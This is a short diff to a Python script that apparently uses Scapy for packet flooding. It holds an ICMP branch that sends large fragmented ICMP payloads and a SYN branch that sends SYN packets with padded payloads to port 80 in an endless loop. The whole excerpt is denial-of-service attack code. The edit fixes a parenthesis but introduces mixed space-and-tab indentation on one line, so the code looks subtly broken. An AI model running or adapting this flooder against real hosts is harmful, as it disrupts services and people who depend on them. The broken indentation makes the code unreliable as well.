@@ -50,11 +50,11 @@ def thread_delay(thread_name, delay, ip):
 	
 
 	if args.icmp:
-		send(numPackets*(fragment(ip_layer/ICMP()/(args.icmp*6000)))
-
+		send(numPackets*(fragment(ip_layer/ICMP()/(args.icmp*6000))))
+		
 
 	elif args.syn:
-		tcp=TCP(sport=RandShort(), dport=80, flags="S")
+    	tcp=TCP(sport=RandShort(), dport=80, flags="S")
 		raw=Raw(args.syn*1024)
 		p=ip_layer/tcp/raw
 		send(p, loop=1, verbose=0)
